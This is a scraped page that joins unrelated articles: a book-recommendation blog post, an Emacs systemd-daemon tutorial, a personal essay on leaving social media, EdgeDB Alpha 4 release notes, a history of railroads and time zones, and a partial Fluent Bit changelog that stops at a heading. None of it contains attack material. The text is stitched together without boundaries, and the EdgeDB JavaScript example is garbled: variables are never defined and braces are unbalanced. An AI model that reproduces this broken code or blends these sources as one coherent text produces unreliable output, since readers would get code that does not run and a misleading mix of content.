<ul><li>Taking recommendations from friends and trusted sources.</li><li>Seeing what’s popular and gravitating towards those books.</li><li>Seeing what’s popular and gravitating away from those books.</li><li>Research your heroes and mentors to see which books influenced them the most.</li><li>Choose only books that you, in 30 years, will be glad you have read.</li><li>Prioritize <a href="https://en.wikipedia.org/wiki/Lindy_effect">the Lindy Effect</a>–books that have been around for a long time, and are likely to stick around long into the future. </li></ul>



<p>I have prioritized the Lindy Effect more in my selection process over recent years. Older books have survived the test of time for a reason. But with modern reading trends seemingly headed towards older books, it can be easy to overlook the many gems that have been published in the 21st century. </p>



<h3>Modern Books That Revolutionized My Life</h3>



<p>I’ve decided to put together a list of modern books (<a href="https://joebalcom.blog/bookshelf/">which you can find more of here</a>) that have revolutionized my life. Books that have drastically changed my views, influenced my thinking, and formed my philosophy over the last 10-15 years. </p>



<p>I’ve broken down this list into sections you might find in your typical bookstore. For each section, I’ve chosen the book that has defined that particular topic in my own life.  These books will certainly give you an idea of why I do what I do, and why I write what I write.</p>



<p>From influence to leadership, from travel to psychedelics, this list is bound to have something for you:</p>







<h3>Biography: <a href="https://amzn.to/2SvO6jn"><span>Benjamin Franklin</span></a> by Walter Isaacson</h3>



<div><figure><a href="https://amzn.to/2CHgJFk"><img src="https://i1.wp.com/images-na.ssl-images-amazon.com/images/I/51e4pdrIVKL._SX328_BO1,204,203,200_.jpg?resize=350%2C530&amp;ssl=1" alt="Read for hours to learn the lessons others took years to learn." width="350" height="530" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/images-na.ssl-images-amazon.com/images/I/51e4pdrIVKL._SX328_BO1,204,203,200_.jpg?resize=350%2C530&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></figure></div>



<p>Quite possibly my favorite historical figure ever. There is so much to learn from this book, not just about the usual textbook stuff you’ve learned in school, but about his struggles, his humorous personality and everything in between. Ben Franklin is someone we should all strive to emulate. And if you’ve never read a Walter Isaacson book, you are sorely missing out on greatness!</p>

<h3>Entrepreneurship: <a href="https://amzn.to/2YtkxTB"><span>The 4-Hour Workweek</span></a> by Tim Ferriss</h3>



<div><figure><a href="https://amzn.to/3fI0rec"><img src="https://i1.wp.com/images-na.ssl-images-amazon.com/images/I/81qW97ndkvL.jpg?resize=350%2C530&amp;ssl=1" alt="Read for hours to learn the lessons others took years to learn." width="350" height="530" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/images-na.ssl-images-amazon.com/images/I/81qW97ndkvL.jpg?resize=350%2C530&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></figure></div>



<p>This is what <a href="https://marginalrevolution.com/marginalrevolution/2007/11/view-quake-read.html">Tyler Cowen</a> would call a “quake book.” One that just changes everything about how you think about and approach life. This book is all about taking your destiny into your own hands, and is one that has had a huge influence on me. The version I read had many outdated (circa 2007) resources, but the message still resonates to this day. Of course, <a href="https://amzn.to/3fI0rec">here is the updated version</a>.</p>

<h3>Fiction: <a href="https://amzn.to/2SMAwbR"><span>How to Get Filthy Rich in Rising Asia</span></a> by Mohsin Hamid</h3>



<div><figure><a href="https://amzn.to/3eIXd8Z"><img src="https://upload.wikimedia.org/wikipedia/en/thumb/8/85/How_to_Get_Filthy_Rich_in_Rising_Asia.jpg/220px-How_to_Get_Filthy_Rich_in_Rising_Asia.jpg" alt="Read for hours to learn the lessons others took years to learn." width="350" height="530" data-lazy-src="https://upload.wikimedia.org/wikipedia/en/thumb/8/85/How_to_Get_Filthy_Rich_in_Rising_Asia.jpg/220px-How_to_Get_Filthy_Rich_in_Rising_Asia.jpg?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></figure></div>



<p>What a fun book this was. “You” are the main character and the story takes you through different phases of your life, from a poor kid from an unnamed south Asian country (resembles Pakistan) to pursuing the successes and navigating the pitfalls of love and business. I don’t read much fiction, but this was an excellent book!</p>

<h3>Leadership: <a href="https://amzn.to/2WlIIAL"><span>Extreme Ownership</span></a> by Jocko Willink</h3>



<div><figure><a href="https://amzn.to/3jbhRBX"><img src="https://i1.wp.com/m.media-amazon.com/images/I/41lJf8ayabL.jpg?resize=350%2C530&amp;ssl=1" alt="Read for hours to learn the lessons others took years to learn." width="350" height="530" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/m.media-amazon.com/images/I/41lJf8ayabL.jpg?resize=350%2C530&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></figure></div>



<p>This was the key book that helped me <a href="https://joebalcom.blog/2020/07/08/destiny/">become a restaurant manager, and lead an organization of 100+ employees</a>. The lesson: if you are to achieve anything of significance in life, if you are to gain trust of subordinates, higher-ups, strangers, friends, or loved ones, you MUST hold yourself accountable for everything that happens. You must take ownership in everything you do. It is the only way.</p>

<h3>Mind/Psychology: <a href="https://amzn.to/2Wlo2Zz"><span>How to Change Your Mind</span></a> by Michael Pollan</h3>



<div><figure><a href="https://amzn.to/3j737Eh"><img src="https://i2.wp.com/images-na.ssl-images-amazon.com/images/I/81z1rs6gVlL.jpg?resize=350%2C530&amp;ssl=1" alt="Read for hours to learn the lessons others took years to learn." width="350" height="530" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/images-na.ssl-images-amazon.com/images/I/81z1rs6gVlL.jpg?resize=350%2C530&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></figure></div>



<p>This one has a special place in my life. Having experienced the effects that various mental illnesses have on some of my closest family and friends, I had always thought that these were things we just had to live with. But Pollan’s book sheds light on the world of psychedelics and their use as a possible treatment and maybe even cure for some illnesses. It has since lit a fire under me to learn everything I can about this largely unknown realm. </p>

<h3>Travel: <a href="https://amzn.to/3c0vRdz"><span>Vagabonding</span></a> by Rolf Potts</h3>



<div><figure><a href="https://amzn.to/2WIDgcf"><img src="https://i1.wp.com/images-na.ssl-images-amazon.com/images/I/91okQD3M2QL.jpg?resize=350%2C530&amp;ssl=1" alt="Read for hours to learn the lessons others took years to learn." width="350" height="530" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/images-na.ssl-images-amazon.com/images/I/91okQD3M2QL.jpg?resize=350%2C530&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></figure></div>



<p>Speaking of lighting fires, this book set off a personal obsession for me over the last nine years. Traveling was never really a part of my life until I was 21. It was this book that opened my mind to <a href="https://joebalcom.blog/2020/06/15/road-trip/">travel as a lifestyle</a>, not just something someone does once a year on vacation.</p>

<h3>Philosophical/Spiritual: <a href="https://amzn.to/2KXUV9f"><span>Love Yourself Like Your Life Depends On It</span></a> by Kamal Ravikant</h3>



<div><figure><a href="https://amzn.to/2Ox36LE"><img src="https://i2.wp.com/m.media-amazon.com/images/I/517gFULQCeL.jpg?resize=350%2C530&amp;ssl=1" alt="Read for hours to learn the lessons others took years to learn." width="350" height="530" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/m.media-amazon.com/images/I/517gFULQCeL.jpg?resize=350%2C530&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></figure></div>



<p>Although there are many more qualified book candidates in this category, Love Yourself was a recent revelation of mine in a time of personal crisis. We all have moments when we don’t quite love ourselves. No matter what situation you find yourself in, this book will help. It is a short read. I read it over a three day trip and it changed my appreciation for myself in a non-trivial way. Kamal also wrote <a href="https://amzn.to/2YsKgvd"><span>Rebirth</span></a>, another amazing book of his that I discuss further in this <a href="https://joebalcom.blog/2020/05/03/forcing-function/"><span>blog post</span></a>.</p>

<h3>Physical: <a href="https://amzn.to/2WqIl85"><span>The 4-Hour Body</span></a> by Tim Ferriss</h3>



<div><figure><a href="https://amzn.to/393TWj0"><img src="https://i0.wp.com/m.media-amazon.com/images/I/41f6XL1RyZL.jpg?resize=350%2C530&amp;ssl=1" alt="Read for hours to learn the lessons others took years to learn." width="350" height="530" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/m.media-amazon.com/images/I/41f6XL1RyZL.jpg?resize=350%2C530&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></figure></div>



<p>The only author who takes up two spots on my list, Tim Ferriss is a beast. This book shaped the approach I take to physical health forever. Using tools, tips, and tactics in the realms of diet, exercise, and supplementation, this is a great book if you’re looking to kick-start a physical change in your life. I’ve lost 50+ lbs of fat combined using the methods in this book. It simply works.</p>

<h3>Productivity: <a href="https://amzn.to/3d76NBO"><span>Deep Work</span></a> by Cal Newport</h3>

<p>Deep work is an underrated concept. We humans now have attention span of a squirrel. Combine that with the up-to-the-minute need for new information, incessant infiltration of our digital lives by email, and the screaming kid or the barking dog, and we have little ability to get anything of consequence done in an efficient manner. The concepts in this book have allowed me to focus more for longer stretches of time, and I believe this blog and other projects I am currently working on are a direct result.</p>

<h3>Social: <a href="https://amzn.to/3dfxLHN"><span>Influence</span></a> by Robert Cialdini</h3>



<div><figure><a href="https://amzn.to/2Cm1VvX"><img src="https://i2.wp.com/images-na.ssl-images-amazon.com/images/I/710glEdDlfL.jpg?resize=350%2C530&amp;ssl=1" alt="Social" width="350" height="530" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/images-na.ssl-images-amazon.com/images/I/710glEdDlfL.jpg?resize=350%2C530&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></figure></div>



<p>I’m gonna cheat a little here, because this book was originally published in the last century. However, this is by far the best book out there on the topic of persuasion. Influence is everywhere we look. It is how things get done. Even if you are not aware of its presence, it’s power is affecting you at this very moment. Which is why this book has had a massive influence on me. Learn how to influence, and learn how you are influenced, and you’ll never see life (or commercials on Nickelodeon) the same way.</p>

<h3>Wealth &amp; Money: <a href="https://amzn.to/3b2D6R0"><span>Money: Master the Game</span></a> by Tony Robbins</h3>



<div><figure><a href="https://amzn.to/30mRfFk"><img src="https://i0.wp.com/images-na.ssl-images-amazon.com/images/I/81x2aSRQqGL.jpg?resize=350%2C530&amp;ssl=1" alt="Wealth &amp; Money" width="350" height="530" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/images-na.ssl-images-amazon.com/images/I/81x2aSRQqGL.jpg?resize=350%2C530&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></figure></div>



<p>Most of the basic concepts of money and how to use it, save it, and invest it, I learned from this book. Tony talks to a plethora of experts and hedge fund managers to discuss all the things we should know (and all the things they don’t teach us in school) about money. Tony Robbins is a master with words, and truly does an amazing job in this book through his synthesis of ideas from the worlds best financial minds.</p>

<p>I hope you enjoyed this list, and I hope you decide to pick up a few of these for your own personal growth journey! These books were, in no small part, responsible for shaping who I am today and the success I’ve had so far in my life. I have no doubt that they will do the same for you.</p>



<p>To get the most out of reading, you don’t have to read every book that piques your interest. You don’t even have to love the process of reading! Look for books, authors, and topics you love. </p>



<p>Reading the right books will change your life for the better. But don’t make it a chore. Read what you love until you love to read. And have fun with it!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
        <p>Recently I’ve switched back to Linux, after having used macOS for the past 9 years.
While I was generally happy with my overall macOS experience, I was also disappointed
that Emacs simply didn’t work as well there, as it does on Linux for various reasons.</p>

<p>When I was a Linux user I’d always run Emacs as a daemon (server) and I’d
connect this daemon from multiple instances of <code>emacsclient</code>. This was both
elegant and efficient - my clients started instantly and shared access to
everything that was running on the daemon instance. While this was doable to
some extent in macOS, it never worked quite as well for me, and I abandoned that
workflow eventually. Now, however, I’m back! Time to revive the workflow!</p>

<p>Historically I ran the Emacs daemon by adding something like this to my shell init (e.g. <code>.bashrc</code>):</p>

<div><div><pre><code><span>export </span><span>ALTERNATE_EDITOR</span><span>=</span><span>''</span>
<span>alias </span><span>e</span><span>=</span><span>'emacsclient --tty'</span>
</code></pre></div></div>

<p>The magic is in the first line - leaving <code>ALTERNATE_EDITOR</code> blank.
That way the first time I ran <code>emacsclient</code> it’d start an Emacs daemon and
connect to it. Many people preferred to make the daemon a “proper” service that
they can start, restart and monitor, but this felt like an overkill to me. I’ve
noticed, however, that Emacs 26.1 bundles a <code>systemd</code> unit, so it’s now trivial
to control your Emacs daemon with <code>systemd</code>. It all boils down to running this command:</p>

<pre><code>$ systemctl --user enable --now emacs
</code></pre>

<p>Run this command with your regular user (or whatever user account you want to be running Emacs). Don’t run it as <code>root</code>, though!
You’ll get a message that the unit file was copied to <code>/usr/lib/systemd/user/emacs.service</code> and you can examine it if you’re curious:</p>

<div><div><pre><code>[Unit]
Description=Emacs text editor
Documentation=info:emacs man:emacs(1) https://gnu.org/software/emacs/

[Service]
Type=simple
ExecStart=/usr/bin/emacs --fg-daemon
ExecStop=/usr/bin/emacsclient --eval "(kill-emacs)"
Environment=SSH_AUTH_SOCK=%t/keyring/ssh
Restart=on-failure

[Install]
WantedBy=default.target
</code></pre></div></div>

<p>Pretty straightforward.</p>

<p>At this point your Emacs daemon is up and you can connect to it using both
terminal clients (<code>emacsclient -t</code>) and GUI clients (<code>emacsclient -c</code>). You
might also want to create some desktop icon that runs <code>emacsclient -c</code>, instead
of <code>emacs</code>.  You might also want to set both <code>EDITOR</code> and <code>VISUAL</code> to
<code>emacsclient -t</code>:</p>

<div><div><pre><code><span>export </span><span>EDITOR</span><span>=</span><span>'emacsclient -t'</span>
<span>export </span><span>VISUAL</span><span>=</span><span>'emacsclient -t'</span>
</code></pre></div></div>

<p>I typically add two more aliases just to be on the safe side:<sup id="fnref:1"><a href="#fn:1">1</a></sup></p>

<div><div><pre><code><span>alias </span><span>vi</span><span>=</span><span>'emacsclient -t'</span>
<span>alias </span><span>vim</span><span>=</span><span>'emacsclient -t'</span>
</code></pre></div></div>

<p>One thing to keep in mind is that when you’re running Emacs in this manner it
won’t read your user environment variables (at least not those coming from your
<code>.bash_profile</code> and <code>.bashrc</code>). That’s why it’s a good idea to install the
popular package
<a href="https://github.com/purcell/exec-path-from-shell">exec-path-from-shell</a>.</p>

<p>Alternatively you can use one of <code>systemd</code>’s own mechanisms for setting environment variables - e.g. <a href="https://www.freedesktop.org/software/systemd/man/environment.d.html">environment.d</a>.
The <a href="https://wiki.archlinux.org/">Arch Linux Wiki</a> has
a few <a href="https://wiki.archlinux.org/index.php/Systemd/User#Environment_variables">good examples</a> of
using <code>environment.d</code> and also mentions other approaches that you can consider.</p>

<p>That’s all I have for you today. I hope you’ve learned something useful. In parentheses we trust!</p>

    <div><p>It's been several months since I left social media for good, though I decided to hang on to Twitter in the end, anticipating that I might need it for professional reasons (but LinkedIn rather ironically had to go.)</p><p> I haven't necessarily seen the quality of my real-life relationships improve as I suggested they might <a href="https://notoriousbfg.com/a-network-less-world" title="Link: https://notoriousbfg.com/a-network-less-world">in my post in February</a>, but I do have a clarity of mind I don't think would have been possible with it; I can't imagine being constantly reminded of coronavirus would have been enjoyable.<br></p><p>It took a while before I stopped framing my life through the lens of Instagram, imagining what the caption for the image I was going to post was going to be, instead of experiencing the moment itself. So I'd certainly say that my ability to experience the present has improved: using my eyes to look at beautiful scenery not my camera; using my ears to hear live music not my microphone. Reading Alan Watts' "The Wisdom of Insecurity" also helped me to realise this.</p><p>Something I've come to appreciate in this time without social media is our need, as a society, to "present" everything we do. Even in a non-virtual sense, it's as though unless we overemphasise the things we're interested in, they're not important. It's not acceptable to merely say "I went kayaking the other day and enjoyed it". I must declare my eternal love to the sport of kayaking or it's not of any interest to anyone. And it seems as though everyone needs to have some kind personal "brand" (and some sort of social "proof".)<br></p><p>I think social media's probably responsible for this. Just as we package and present our lives in a certain way online, we feel the need to do so in real-life to make ourselves seem more interesting, because "more likes in the virtual world translate to more popularity in the real world". My generation was the first to grow up with social media so it's interesting to see all these biases finally emerge from our subconsciouses.<br></p><p>What's more important is how I think we define our own personal value. If we're to remove others from the equation, do our interests make us happy because of the way they make <i>us</i> feel?</p><p>That's all that really matters.<br></p></div>

<p>After six weeks of work since <a href="https://edgedb.com/blog/edgedb-1-0-alpha-3">Alpha 3</a>, we are happy to
            announce the immediate release of EdgeDB 1.0 Alpha 4 “Barnard’s Star”. You
            can <a href="https://edgedb.com/download">download</a> it in a number of ways or try it out in our
            <a href="https://tutorial.edgedb.com/">interactive tutorial</a> without the need to install anything.</p>

<p>This time around we focused on making the database more intuitive from
            both the server and the client perspective.  While there’s fewer changes
            due to our newly adopted six-week release cycle, we’re able to deliver them
            to you much quicker.  Let’s go through some highlights of the release!</p>
<h4>What’s EdgeDB</h4>
<p>EdgeDB is an advanced <a href="https://github.com/edgedb/edgedb">open source</a> relational database based on
            PostgreSQL.  The project aims to give developers and data engineers a highly
            efficient and productive database technology while addressing the
            <a href="https://edgedb.com/blog/we-can-do-better-than-sql">shortcomings of SQL</a> and its surrounding ecosystem:</p>
<ul>
<li>
<p>high-level data model and type system;</p>
</li>
<li>
<p>a powerful, expressive and extensible query language that allows working
                    with complex data relationships easily;</p>
</li>
<li>
<p>first-class support for schema migrations;</p>
</li>
<li>
<p>support for converting arbitrary strictly typed data to and from JSON
                    via a simple cast operator;</p>
</li>
<li>
<p>out-of-the-box interoperability via REST and GraphQL.</p>
</li>
</ul>

<p>One of the ways in which we’re setting EdgeDB apart from previous generation
                databases is the focus on usability of day-to-day tasks.  One particularly
                gnarly topic is maintenance of server instances: installing a new version,
                upgrading existing databases to a new version, setting up an instance to
                run properly as a service daemon, accessing logs, and so on.  It gets
                especially tricky when multiple operating systems provide their own unique
                ways to achieve those tasks.  Even better if the user needs to keep
                a few versions running concurrently.</p>
<p>We looked at how efficient <a href="https://rustup.rs/">rustup</a> is in ensuring the user
                has a fully functional up-to-date installation of the Rust toolchain,
                and got inspired: what if we can provide <em>this</em> experience for a database?</p>
<p>The end result is the new <code>edgedb server</code> group of commands that ships with
                the default EdgeDB CLI. Its design was planned and discussed as part of an
                RFC process which, as the rest of EdgeDB, is open. <a href="https://github.com/edgedb/rfcs/blob/master/text/1001-edgedb-server-control.rst">Check it out</a>!</p>
<p>The most visible change related to <code>edgedb server</code> is that it is now
                the new recommended way to install EdgeDB servers on your operating
                system.  See <code>edgedb server install --help</code> for details.  The
                underlying installer will still use your operating system’s package
                manager but it provides instance configuration in ways that allow for
                running multiple EdgeDB versions concurrently on one machine.  And with
                <code>edgedb server upgrade</code> you can easily bump the version on an existing
                installation without having to redo configuration or dump and restore
                data manually.</p>
<p>And how do you get the new CLI tool on your machine?  We redesigned the
                <a href="https://edgedb.com/download">Download</a> page to be more inviting, providing a new
                cross-platform way to install EdgeDB with a single-liner in the terminal.
                And if you’re a macOS user, you might want to use our new Homebrew tap!</p>
</div>
<div id="javascript-bindings-got-more-powerful">

<p>We supercharged <a href="https://github.com/edgedb/edgedb-js/">edgedb-js</a>, our JavaScript client for EdgeDB,
                with an efficient <a href="https://edgedb.com/docs/clients/01_js/usage#connection-pools">connection pooling</a> implementation. This
                allows users write faster applications with less code.</p>

<pre><span><span><span>import</span> <span>{</span>createPool<span>}</span> <span>from</span> <span>'edgedb'</span><span>;</span>

  <span>try</span> <span>{</span>
    conn<span>.</span><span>query</span><span>(</span><span>'SELECT business_logic(10 / $num)'</span><span>,</span> <span>{</span>num<span>:</span> <span>42</span><span>}</span><span>)</span><span>;</span>
  <span>}</span> <span>finally</span> <span>{</span>
    conn<span>.</span><span>execute</span><span>(</span><span>'ROLLBACK'</span><span>)</span><span>;</span>
  <span>}</span>
<span>}</span><span>)</span><span>;</span>



<span>const</span> conn <span>=</span> <span>await</span> pool<span>.</span><span>acquire</span><span>(</span><span>)</span><span>;</span>
<span>try</span> <span>{</span>

  <span>await</span> pool<span>.</span><span>release</span><span>(</span>conn<span>)</span><span>;</span>
<span>}</span></span></span></pre>
<p>We also thought hard about the API and decided that <code>fetch*()</code> function
                names don’t really sound very natural when you’re trying to insert or update
                data. We renamed them to <code>query*()</code> which is the obvious name in hindsight:</p>
<pre><span><span><span>async</span> <span>function</span> <span>example</span><span>(</span>conn<span>)</span> <span>{</span>
  
  <span>await</span> conn<span>.</span><span>query</span><span>(</span><span><span>`
    INSERT User {
      name := 'Alice'
    }
  `</span></span><span>)</span>
<span>}</span></span></span></pre>
<p>The change actually originated in our Python client and this is <a href="https://github.com/edgedb/edgedb-python/issues/51">where the
                    change was discussed</a>.</p>
</div>
<div id="describe-is-worth-a-thousand-greps">
<h2 id="describe-is-worth-a-thousand-greps"><a href="https://edgedb.com/blog/edgedb-1-0-alpha-4-barnard-s-star#describe-is-worth-a-thousand-greps"><svg width="35" height="35" viewBox="0 0 35 35"><path d="M2.694 6.631h19.085v3.961h-1.944V8.574H4.636v10.962h15.199V17.52h1.944v3.96H2.694V6.632zM13.3 13.085h19.086v14.848H13.3v-3.962h1.942v2.019h15.2V15.027h-15.2v2.017H13.3v-3.96z" fill="#047CFF"></path></svg></a>DESCRIBE Is Worth a Thousand Greps</h2>
<p>As part of the usability sprint we made <code>DESCRIBE</code> better.  When
                describing objects, it will now list all matches for the specified name
                if available.  This is particularly interesting in case of user functions
                masking user types or standard types/functions.</p>
<p><code>DESCRIBE ROLES</code> and <code>DESCRIBE SYSTEM CONFIG</code> in turn allow you to
                quickly assess the respective areas of the database, and make dumping an
                entire server instance easier.</p>
</div>
<div id="stored-migrations-are-coming">

<p>The back-end implementation for the much improved workflow for migrations
                is mostly complete.  The next step is providing a CLI for it, which we
                plan to release as part of Alpha 5.</p>
<p>We think this set of features will be an important foundation of successful
                EdgeDB adoption. You can read more about them in our <a href="https://github.com/edgedb/rfcs/blob/master/text/1000-migrations.rst">open RFC document</a> on the topic.</p>
</div>
<div id="you-can-talk-to-us-right-on-github">

<p>GitHub is introducing a new feature called <a href="https://github.com/orgs/edgedb/discussions">Discussions</a>, a
                way to keep conversations happen close to the code which don’t really belong
                in Issues or Pull Requests.</p>
<p>We used to use Spectrum Chat for this purpose but as soon as we tried out
                Discussions, we knew this is a natural fit for us and our community.
                We’re an open product with a strong GitHub presence and you probably already
                have a GitHub account… so <a href="https://github.com/orgs/edgedb/discussions">come talk to us!</a></p>
</div>
<div id="summary">

<p>Barnard’s Star is the first release under our new release cycle. Our ambition
                is to always deliver frontpage-worthy new features, but we also understand
                those never get built in one development sprint.  At the same time, frequent
                milestones have many advantages both for us and our users.</p>
<p>With this in mind we’re proud to share Barnard’s Star with you, a release
                which is a step forward that tells a story.  We hope you’ll enjoy the
                improvements we’ve made, and just as importantly, come along for the
                ride and witness how they’re built <em>as they are being built</em>.</p>
<p>As usual, the <a href="https://edgedb.com/docs/changelog/1_0_a4">change log</a> provides a detailed story of the
                changes in this release.</p>

<p>It’s hard to imagine a world without time zones; it is such a basic and fundamental construct of travel, transportation and planning. But time zones weren’t really a thing until the mid to late 1800s with the invention of mechanical clocks that were built to a level of sophistication that could keep regular time. &nbsp;Prior to this local towns kept their own time via solar measurement. In a world before quick cross country travel and trade, in many ways there wasn’t a huge necessity to change.</p>



<p>The very first establishment of a fixed time zone, beyond just local solar time keeping was in the UK when the government wanted to provide a means for ocean going vessels to better plan their voyages and calculate longitude using a standard time.</p>



<p>As railroads developed in the 1800s, disconnected and altering times made it nearly impossible to coordinate departures, arrivals and general railway operations without correct time. The first adoption of a time zone was again in the UK in 1840 as the Great Western Railroad sought to better plan their operations.</p>



<p>In 1868 New Zealand, which was then a British colony adopted a standard time. This became the first standardized time outside UK. Other countries followed in a limited way as the advantages of defining time zones was apparent let there was no consensus on how to further expand the system and many local areas simply preferred “their time”. </p>

<p>Railroads in the United States were expanding rapidly across the country during the mid 1800s. Particularly following the conclusion of the civil war railroads were  what the tech industry is today, with new ones popping up constantly, and incumbents expanding rapidly. But they were struggling to adopt their operations to their broadening web of tracks.  Railroads were still “new” and in many ways crude, railroads often didn’t coordinate operations well between other railroads and were stuck utilizing telegraphs, with many poles and wires being strung up alongside tracks. The continued reliance on local solar time, generally calculated from the hometown of the railroad’s headquarters certainly didn’t help.</p>



<p>It took until 1863 for what we know understand as time zones to be proposed by Charles Dowd, as a way to better manage this. However it took nearly twenty more years for everyone to agree on the best way to divide North America’s time zones. With ongoing discussion with Canada’s railways, the four time zone division was finally put into action in 1883 following further time zone development by Canadian engineer Sanford Fleming . Even this later push for time zones likely wouldn’t have seen it’s way to enactment if the editor of <em>Official Guide to Railways </em> didn’t take up the cause and use his connections to push the matter to various officials across the country.&nbsp; There was still no national mandate requiring cities to adopt this standard and some cities held out , instead preferring to rely on their own time. &nbsp;Finally in 1918 congress mandated the time zones nationwide.</p>



<p>Railroads spurred this development because they were the first type of transportation that could cover distances in a way that would make time coordination important. Trips went from taking several weeks or even months to taking at most a couple days. The rapid speed and advancement of transportation meant that the country was more connected than ever and needed a standard method of coordinating this new form of transportation to let it flourish. Many railroad tracks were and still are single track, meaning that trains heading in opposing directions must pass each other at special sidings or passing tracks that allow one train to pass the other. The trains must carefully coordinate these “meets”, as failure to do so can result in deadly head on collisions. Speeds rapidly rose as well on railroads, with very early trains moving at only 10-15 mph but within twenty years many passenger trains were moving at 30-40mph then by 1900 speeds of 70-90 mph were not uncommon. The amount of precision required to maintain train schedules and safely operate railroads increased dramatically along the increase in train speeds and the shear number of trains operating on railway systems.</p>

<p>For years train crews would carefully double check that their watches were properly adjusted to the master clock at railway stations to ensure they could accurately operate to the required train schedule. Generally the most accurate clock in most towns around this time period was the clock at the railway station. Lots of railway stations either had a large wall clock or larger ones even had a clock tower.</p>



<figure><img src="https://zmodal.com/wp-content/uploads/2020/07/4174797193_f7de956eb1_o.jpg" alt="" srcset="https://zmodal.com/wp-content/uploads/2020/07/4174797193_f7de956eb1_o.jpg 417w, https://zmodal.com/wp-content/uploads/2020/07/4174797193_f7de956eb1_o-200x300.jpg 200w" sizes="(max-width: 417px) 100vw, 417px"><figcaption><em>The railway station’s clock tower – 1954</em></figcaption></figure>



<p>Even today on Amtrak’s busy Northeast Corridor, coordinating arrival and departure times precisely is required to operate the system efficiently and safely given the number of daily trains operating on the lines. Particularly for high speed rail with trains speeds commonly over 140mph, maintaining a very tight schedule is incredibly important to maintain appropriate space between trains on the railroad and to avoid delays. </p>



<p>Of course obtaining the accurate time is as easy as pulling your phone out. Train dispatching centers use a mix of Centralized traffic control, signal systems throughout the rail system and ample radio communication to operate rail lines. Increasingly railway locomotives have GPS devices that provide dispatchers controlling train movements a clear picture of exactly where a train is and how fast it is moving. This type of visibility has only been common place in the last decade or so.  It wasn’t until the mid 1960s-1970s that all trains had radio systems that could be used to communicate between trains and dispatching centers. </p>



<p>With the rise of the US interstate highway system and widespread adoption of the automobile, trains came to play a less important role in the daily lives of business and tourist travelers. The majority of freight travels by truck, but still nearly 40% of total gross tons of all freight moved overland in the US is moved via rail. The development of containerization played a key role in railroad’s continued large role in general freight. This type of transportation known as intermodal, utilizes multiple modes of transportation such as ocean ships, trucks and trains to collectively move the container the most efficient way to it’s final destination. For example a import container from Korea might be off loaded from a ship in Los Angeles onto a train. The train then takes the container to Memphis, where it is loaded onto a truck for local delivery. This method utilizes the long haul efficiency of rail with the short haul utility of trucks.  Railroads also haul a significant amount of break bulk freight in railroad cars such as ethanol in tank cars or coal in hopper cars and provide cross border shipping from Mexico and Canada. With the creation of NAFTA cross border freight moving via train massively increased in volume. Trucks would not be able to efficiently haul the volume of freight one train can, meaning one train can move the same amount of cargo as literally hundreds of trucks. Trains are also around four times more energy efficient than over the road trucks representing a great way to reduce carbon emission within supply chains.</p>



<p>Likely if railroads hadn’t been the driver of time zone adoption, increased globalization and the development of airplanes would have. Coordinating global businesses, stock markets, air travel and countless other modern essential would be made impossible without the use of standardized time zones.</p>



<p>Interestingly enough worldwide time zone development was somewhat independent of the North American and European adoption of it. While a wordwide timezone system was proposed in 1879, it wasn’t adopted until about 1929. </p>

<p>Starting from this release, all TCP connections are KeepAlive enabled by default. Please refer to the following Networking section to learn more about these features:</p>

<p>https://docs.fluentbit.io/manual/administration/networking</p>

<h3 id="monitoring">Monitoring</h3>

<p>Understanding how the logging layer is operating is critical, as part of this release we have done two improvements that aims to help our users to troubleshoot and optimize properly:</p>

<h4 id="storage-layer">Storage Layer</h4>

<p>Our storage layer that handle all data buffering requirements for memory and file system now exposes an optional HTTP end-point to consume it metrics, so now is possible to measure all pipeline buffers and get a clear status of each component:</p>

<ul>
  <li>https://docs.fluentbit.io/manual/administration/monitoring#rest_api</li>
</ul>

<h4 id="dashboards-and-alerts">Dashboards and Alerts</h4>

<p>We have introduced tips and examples on how to integrate better Grafana and create alerts in your Dashboards:</p>

<p>https://docs.fluentbit.io/manual/administration/monitoring#dashboard-and-alerts</p>

<h3 id="new-and-updated-input-plugins">New and updated Input Plugins</h3>

<h4 id="forward">Forward</h4>

<p>The <a href="https://docs.fluentbit.io/manual/pipeline/inputs/forward">Forward input plugin</a> speaks the <code>Fluentd Forward</code> protocol. In this version we added support for <code>ACK</code> feature to enable <em>at-least-once</em>. It also adds support to handle GZIP compressed payloads.</p>

<h4 id="docker-events">Docker Events</h4>

